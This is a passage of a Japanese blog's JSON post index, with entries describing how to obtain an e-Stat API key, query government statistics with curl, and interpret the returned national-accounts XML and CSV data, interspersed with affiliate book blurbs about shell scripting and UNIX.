シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-26T21:54:39+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/anal_hu1fa49663358d8289c9aaa2b108c2bef9_133702_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/","title":"e-Statで面白いデータを探そう。ランキング上位「アイスクリーム」ってなんだ？"},{"content":"今回は前回登場したデータの内容を調べてみましょう。\n「統計表情報取得」（リスト取得）APIで取得したデータをもとにe-Statのサイト（https://www.e-stat.go.jp/）からデータを見つけてみましょう。\n\u0026lt;LIST_INF id=\u0026#34;0003384123\u0026#34;\u0026gt; \u0026lt;STAT_NAME code=\u0026#34;00100409\u0026#34;\u0026gt;国民経済計算\u0026lt;/STAT_NAME\u0026gt; \u0026lt;GOV_ORG code=\u0026#34;00100\u0026#34;\u0026gt;内閣府\u0026lt;/GOV_ORG\u0026gt; \u0026lt;STATISTICS_NAME\u0026gt;四半期別ＧＤＰ速報 過去の値 1次速報値\u0026lt;/STATISTICS_NAME\u0026gt; \u0026lt;TITLE\u0026gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）\u0026lt;/TITLE\u0026gt; \u0026lt;CYCLE\u0026gt;四半期\u0026lt;/CYCLE\u0026gt; \u0026lt;SURVEY_DATE\u0026gt;201007-201009\u0026lt;/SURVEY_DATE\u0026gt; \u0026lt;OPEN_DATE\u0026gt;2020-04-01\u0026lt;/OPEN_DATE\u0026gt; \u0026lt;SMALL_AREA\u0026gt;0\u0026lt;/SMALL_AREA\u0026gt; \u0026lt;/LIST_INF\u0026gt; データを検索してみよう IDで検索できるのが一番良いのですが、キーワード検索のテキストフィールドに入力して検索してもダメでした。\nしょうが無いので、TITLE全文「形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）」で検索しましたがでダメでした。\n少し削って、「形態別国内家計最終消費支出 年度デフレータ—　前年度比」 だと４０５件。\n多すぎるので、SURVEY_DATE、OPEN_DATEを使って調査年、調査月、公開年月で絞り込むと２件に絞り込めました。\nあとはSTATISTICS_NAMEで特定できました。\n詳細ページに行ってみましょう https://www.e-stat.go.jp/stat-search/database?page=1\u0026query=%E5%BD%A2%E6%85%8B%E5%88%A5%E5%9B%BD%E5%86%85%E5%AE%B6%E8%A8%88%E6%9C%80%E7%B5%82%E6%B6%88%E8%B2%BB%E6%94%AF%E5%87%BA%20%E5%B9%B4%E5%BA%A6%E3%83%87%E3%83%95%E3%83%AC%E3%83%BC%E3%82%BF%E2%80%94%E3%80%80%E5%89%8D%E5%B9%B4%E5%BA%A6%20%20%20%20%20%20%20\u0026layout=dataset\u0026year=20100\u0026month=23070900\u0026open_date=202004\u0026statdisp_id=0003384123\u0026metadata=1\u0026data=1\n上段が「統計表情報取得」の内容\n統計表情報 下段が「メタ情報取得」の内容見たいです。\nメタ情報取得 DBをクリックするとグラフが表示されました。\nグラフ 行情報が「1981年度、1982年度、1983年度。。。」\n列情報が「家計最終消費支出（再掲）、家計最終消費支出（再掲）_居住者家計の海外での直接購入、。。。」\nなんと、APIクリックすると丁寧にクエリを表示してくれました(API仕様書とか見る必要ないですね)。\nAPI フォーマットもXML,JSON,CSVが選べますね。\n私はCSVの方が扱いやすいのでこれからはCSVでダウンロードすることにします。\nappIdがカラに空になっているので追加してcurlで叩くだけでいいですね。至れり尽くりです。\ncurl \u0026#34;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003384123\u0026amp;metaGetFlg=Y\u0026amp;cntGetFlg=N\u0026amp;explanationGetFlg=Y\u0026amp;annotationGetFlg=Y\u0026amp;sectionHeaderFlg=1\u0026amp;replaceSpChars=0\u0026#34; \u0026#34;tab_code\u0026#34;,\u0026#34;表章項目\u0026#34;,\u0026#34;cat01_code\u0026#34;,\u0026#34;形態別国内家計最終消費支出\u0026#34;,\u0026#34;time_code\u0026#34;,\u0026#34;時間軸（年度）\u0026#34;,\u0026#34;unit\u0026#34;,\u0026#34;value\u0026#34;,\u0026#34;annotation\u0026#34; \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;家計最終消費支出（再掲）\u0026#34;,\u0026#34;1981100000\u0026#34;,\u0026#34;1981年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;3.8\u0026#34;,\u0026#34;\u0026#34; \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;家計最終消費支出（再掲）\u0026#34;,\u0026#34;1982100000\u0026#34;,\u0026#34;1982年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;2.3\u0026#34;,\u0026#34;\u0026#34; \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;家計最終消費支出（再掲）\u0026#34;,\u0026#34;1983100000\u0026#34;,\u0026#34;1983年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;\u0026#34; . . . \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;12\u0026#34;,\u0026#34;家計最終消費支出（再掲）_居住者家計の海外での直接購入\u0026#34;,\u0026#34;1981100000\u0026#34;,\u0026#34;1981年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;17.6\u0026#34;,\u0026#34;\u0026#34; \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;12\u0026#34;,\u0026#34;家計最終消費支出（再掲）_居住者家計の海外での直接購入\u0026#34;,\u0026#34;1982100000\u0026#34;,\u0026#34;1982年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;15.6\u0026#34;,\u0026#34;\u0026#34; \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;12\u0026#34;,\u0026#34;家計最終消費支出（再掲）_居住者家計の海外での直接購入\u0026#34;,\u0026#34;1983100000\u0026#34;,\u0026#34;1983年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;-1.8\u0026#34;,\u0026#34;\u0026#34; データの見方は？ DBで表示させた「統計表表示」と見比べてみると\nグラフ \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;家計最終消費支出（再掲）\u0026#34;,\u0026#34;1981100000\u0026#34;,\u0026#34;1981年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;3.8\u0026#34;,\u0026#34;\u0026#34; が１行目「1981年度」の１列目「家計最終消費支出（再掲）」に該当するみたいですね。\n１セル、１行のデータ構造みたいですね。\n１列目の情報がしばらく続いて、全行終わると次は２列目の情報みたいな構成だということがわかりました。\n国民経済計算って何 このデータは国民経済計算を算出したものということですが、国民経済計算ってなんでしょう？\n内閣府のサイトによると\n国民経済計算は「四半期別ＧＤＰ速報」と「国民経済計算年次推計」の２つからなっている。「四半期別ＧＤＰ速報」は速報性を重視し、ＧＤＰをはじめとする支出側系列等を、年に８回四半期別に作成・公表している。「国民経済計算年次推計」は、生産・分配・支出・資本蓄積といったフロー面や、資産・負債といったストック面も含めて、年に１回作成・公表している。\nGDPを算出するための何かみたいですね。\ngoogleの検索結果を見てみると、国や地方自治体のサイトや経済学の解説サイトがメインで、たまに今年のGDPはどうだったという記事でちょっと書かれてたりしました。\n記事の中でちょっと気になったのは、\n日本では新型コロナウイルスの影響で個人消費が落ち込んでおり、貯蓄が増加傾向にあります。内閣府の国民経済計算によると、2020年に消費されずに貯蓄に回ったお金は、一律10万円の特別定額給付金の影響もあり、35.8兆円に達しました。この額は前年の5倍の水準です。\n所得に対する貯蓄の割合を示す家計貯蓄率は13.1%と19年度（3.7%）から大きく上昇した。\n前年度から比較して急激に大きくなったという部分(5倍も！)。こういうのは是非ピックアップしたいと思いました。\ne-Statでのマイニングの目的は とわ言え「国民経済計算」全般的に堅い感じですね。。。。\n私のe-Statマイニングの目的は大量の政府公開データに埋もれている中から人の興味を引きそうな面白そうなコンテンツをピックアップしてわかりやすくサマリーを表示することなのです。\nキーワードランキングを見てみると「アイスクリーム」「身長・体重の平均値」みたいな面白そうな柔らかめのコンテンツもあるんです。\nランキング 次回から、\n・e-Statの森の中から面白いコンテンツを見つけよう\n・うまくサマライズして表示しよう\n興味深い列情報に絞りたい\n前年度から５倍とか急激に変化した部分をピックアップして伝えたい\nという視点からe-Statを調査していきたいと思います。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-25T21:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/","title":"e-Statのデータの見方"},{"content":"知識ゼロからのe-Statマイニング\n日頃から大量のデータを使ってデータマイニングしてみたいなと思って暇なときにサイトを巡回していたらe-Statという日本の統計が閲覧できる政府統計ポータルサイトを発見しました。\nアイスの売り上げから子供の平均身長まで大量の統計資料が公開されており、しかもAPIまであるすごいサイトです。 このe-Statをマイニングしてみようと思います。\nまずはAPIを叩くところまでやってみます。\nまずはアプリケーションIDを取得しよう APIを叩くにはアプリケーションIDが必要です。\nまずはアプリケーションIDを取得しましょう。\nアプリケーションIDを取得するにはユーザー登録が必要です。以下のURLから手順に従ってユーザー登録してください。\nhttps://www.e-stat.go.jp/mypage/user/preregister\nアプリケーションIDはログイン後マイページ内のAPI機能(アプリケーションID発行)で取得できます。\nhttps://www.e-stat.go.jp/mypage/view/api\n入力項目は名称、URL、概要の３つです。\n名称、概要は適当で大丈夫です。\nURLは、http://localhostだと私はダメだったのでこのサイトのURLを設定しました。\n発行ボタンを押すとappIdにアプリケーションIDが払い出されます。\nAPIを叩いてみよう APIの仕様は以下のURLに記載されています。\nhttps://www.e-stat.go.jp/api/api-info/e-stat-manual3-0\n難しいです。\nなんとなく、「統計表情報取得」でリストを取得して、「メタ情報取得」「統計データ取得」で個別のデータを取得する感じでしょうか？\nまずは叩いてみます。\n統計表情報取得 curl \u0026#34;http://api.e-stat.go.jp/rest/1.0/app/getStatsList?appId=xxxxxxxxx\u0026amp;lang=J\u0026amp;searchKind=\u0026amp;searchWord=\u0026#34; \u0026lt;LIST_INF id=\u0026#34;0003384123\u0026#34;\u0026gt; \u0026lt;STAT_NAME code=\u0026#34;00100409\u0026#34;\u0026gt;国民経済計算\u0026lt;/STAT_NAME\u0026gt; \u0026lt;GOV_ORG code=\u0026#34;00100\u0026#34;\u0026gt;内閣府\u0026lt;/GOV_ORG\u0026gt; \u0026lt;STATISTICS_NAME\u0026gt;四半期別ＧＤＰ速報 過去の値 1次速報値\u0026lt;/STATISTICS_NAME\u0026gt; \u0026lt;TITLE\u0026gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）\u0026lt;/TITLE\u0026gt; \u0026lt;CYCLE\u0026gt;四半期\u0026lt;/CYCLE\u0026gt; \u0026lt;SURVEY_DATE\u0026gt;201007-201009\u0026lt;/SURVEY_DATE\u0026gt; \u0026lt;OPEN_DATE\u0026gt;2020-04-01\u0026lt;/OPEN_DATE\u0026gt; \u0026lt;SMALL_AREA\u0026gt;0\u0026lt;/SMALL_AREA\u0026gt; \u0026lt;/LIST_INF\u0026gt; LIST_INF idの「0003384123」」が個別データのidみたいです。これを使ってメタ情報取得、統計情報取得を呼び出します。\n##メタ情報取得\ncurl \u0026#34;http://api.e-stat.go.jp/rest/1.0/app/getMetaInfo?appId=xxxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003384123\u0026#34; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;GET_META_INFO xsi:noNamespaceSchemaLocation=\u0026#34;https://api.e-stat.go.jp/rest/1.0/schema/GetMetaInfo.xsd\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;RESULT\u0026gt; \u0026lt;STATUS\u0026gt;0\u0026lt;/STATUS\u0026gt; \u0026lt;ERROR_MSG\u0026gt;正常に終了しました。\u0026lt;/ERROR_MSG\u0026gt; \u0026lt;DATE\u0026gt;2021-12-24T18:35:07.926+09:00\u0026lt;/DATE\u0026gt; \u0026lt;/RESULT\u0026gt; \u0026lt;PARAMETER\u0026gt; \u0026lt;LANG\u0026gt;J\u0026lt;/LANG\u0026gt; \u0026lt;STATS_DATA_ID\u0026gt;0003384123\u0026lt;/STATS_DATA_ID\u0026gt; \u0026lt;/PARAMETER\u0026gt; \u0026lt;METADATA_INF\u0026gt; \u0026lt;TABLE_INF id=\u0026#34;0003384123\u0026#34;\u0026gt; \u0026lt;STAT_NAME code=\u0026#34;00100409\u0026#34;\u0026gt;国民経済計算\u0026lt;/STAT_NAME\u0026gt; \u0026lt;GOV_ORG code=\u0026#34;00100\u0026#34;\u0026gt;内閣府\u0026lt;/GOV_ORG\u0026gt; \u0026lt;STATISTICS_NAME\u0026gt;四半期別ＧＤＰ速報 過去の値 1次速報値\u0026lt;/STATISTICS_NAME\u0026gt; \u0026lt;TITLE\u0026gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）\u0026lt;/TITLE\u0026gt; \u0026lt;SURVEY_DATE\u0026gt;201007-201009\u0026lt;/SURVEY_DATE\u0026gt; \u0026lt;/TABLE_INF\u0026gt; \u0026lt;CLASS_INF\u0026gt; \u0026lt;CLASS_OBJ id=\u0026#34;tab\u0026#34; name=\u0026#34;表章項目\u0026#34; description=\u0026#34;Excelの書式設定で統計表の数値を\u0026amp;quot;-0.0\u0026amp;quot;としている場合、データベース上\u0026amp;quot;0.0\u0026amp;quot;として収録されているため、Excel統計表の数値とは必ずしも一致しない。\u0026#34;\u0026gt; \u0026lt;CLASS code=\u0026#34;17\u0026#34; name=\u0026#34;前年度比\u0026#34; level=\u0026#34;\u0026#34; unit=\u0026#34;％\u0026#34;/\u0026gt; \u0026lt;/CLASS_OBJ\u0026gt; \u0026lt;CLASS_OBJ id=\u0026#34;cat01\u0026#34; name=\u0026#34;形態別国内家計最終消費支出\u0026#34;\u0026gt; \u0026lt;CLASS code=\u0026#34;11\u0026#34; name=\u0026#34;家計最終消費支出（再掲）\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;12\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_居住者家計の海外での直接購入\u0026#34; level=\u0026#34;2\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;13\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_（控除）非居住者家計の国内での直接購入\u0026#34; level=\u0026#34;2\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;14\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_国内家計最終消費支出\u0026#34; level=\u0026#34;2\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;15\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_国内家計最終消費支出_耐久財\u0026#34; level=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;16\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_国内家計最終消費支出_半耐久財\u0026#34; level=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;17\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_国内家計最終消費支出_非耐久財\u0026#34; level=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;18\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_国内家計最終消費支出_サービス\u0026#34; level=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;/CLASS_OBJ\u0026gt; \u0026lt;CLASS_OBJ id=\u0026#34;time\u0026#34; name=\u0026#34;時間軸（年度）\u0026#34;\u0026gt; \u0026lt;CLASS code=\u0026#34;1981100000\u0026#34; name=\u0026#34;1981年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1982100000\u0026#34; name=\u0026#34;1982年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1983100000\u0026#34; name=\u0026#34;1983年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1984100000\u0026#34; name=\u0026#34;1984年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1985100000\u0026#34; name=\u0026#34;1985年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1986100000\u0026#34; name=\u0026#34;1986年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1987100000\u0026#34; name=\u0026#34;1987年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1988100000\u0026#34; name=\u0026#34;1988年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1989100000\u0026#34; name=\u0026#34;1989年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; 上の方がデータ内容の説明なのか？よくわかりません。\n統計情報取得 curl \u0026#34;http://api.e-stat.go.jp/rest/1.0/app/getStatsData?limit=10000\u0026amp;appId=xxxxxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003384123\u0026amp;metaGetFlg=N\u0026amp;cntGetFlg=N\u0026#34; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;GET_STATS_DATA xsi:noNamespaceSchemaLocation=\u0026#34;https://api.e-stat.go.jp/rest/1.0/schema/GetStatsData.xsd\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;RESULT\u0026gt; \u0026lt;STATUS\u0026gt;0\u0026lt;/STATUS\u0026gt; \u0026lt;ERROR_MSG\u0026gt;正常に終了しました。\u0026lt;/ERROR_MSG\u0026gt; \u0026lt;DATE\u0026gt;2021-12-24T18:37:22.156+09:00\u0026lt;/DATE\u0026gt; \u0026lt;/RESULT\u0026gt; \u0026lt;PARAMETER\u0026gt; \u0026lt;LANG\u0026gt;J\u0026lt;/LANG\u0026gt; \u0026lt;STATS_DATA_ID\u0026gt;0003384123\u0026lt;/STATS_DATA_ID\u0026gt; \u0026lt;DATA_FORMAT\u0026gt;X\u0026lt;/DATA_FORMAT\u0026gt; \u0026lt;START_POSITION\u0026gt;1\u0026lt;/START_POSITION\u0026gt; \u0026lt;LIMIT\u0026gt;10000\u0026lt;/LIMIT\u0026gt; \u0026lt;METAGET_FLG\u0026gt;N\u0026lt;/METAGET_FLG\u0026gt; \u0026lt;CNT_GET_FLG\u0026gt;N\u0026lt;/CNT_GET_FLG\u0026gt; \u0026lt;/PARAMETER\u0026gt; \u0026lt;STATISTICAL_DATA\u0026gt; \u0026lt;TABLE_INF id=\u0026#34;0003384123\u0026#34;\u0026gt; \u0026lt;STAT_NAME code=\u0026#34;00100409\u0026#34;\u0026gt;国民経済計算\u0026lt;/STAT_NAME\u0026gt; \u0026lt;GOV_ORG code=\u0026#34;00100\u0026#34;\u0026gt;内閣府\u0026lt;/GOV_ORG\u0026gt; \u0026lt;STATISTICS_NAME\u0026gt;四半期別ＧＤＰ速報 過去の値 1次速報値\u0026lt;/STATISTICS_NAME\u0026gt; \u0026lt;TITLE\u0026gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）\u0026lt;/TITLE\u0026gt; \u0026lt;SURVEY_DATE\u0026gt;201007-201009\u0026lt;/SURVEY_DATE\u0026gt; \u0026lt;TOTAL_NUMBER\u0026gt;232\u0026lt;/TOTAL_NUMBER\u0026gt; \u0026lt;FROM_NUMBER\u0026gt;1\u0026lt;/FROM_NUMBER\u0026gt; \u0026lt;TO_NUMBER\u0026gt;232\u0026lt;/TO_NUMBER\u0026gt; \u0026lt;/TABLE_INF\u0026gt; \u0026lt;DATA_INF\u0026gt; \u0026lt;NOTE char=\u0026#34;***\u0026#34;\u0026gt;数字が得られないもの\u0026lt;/NOTE\u0026gt; \u0026lt;NOTE char=\u0026#34;-\u0026#34;\u0026gt;数字が得られないもの\u0026lt;/NOTE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1981100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;3.8\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1982100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;2.3\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1983100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;2\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1984100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;2.2\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1985100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;1.2\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1986100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;0.1\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1987100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;0.5\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1988100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;0.5\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1989100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;2.5\u0026lt;/VALUE\u0026gt; VALUEが値みたいですがどういう列情報になっているのでしょうか？\nとりあえずAPIはお手軽に叩けることがわかりました。\n次回以降はデータの内容を理解していこうと思います。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 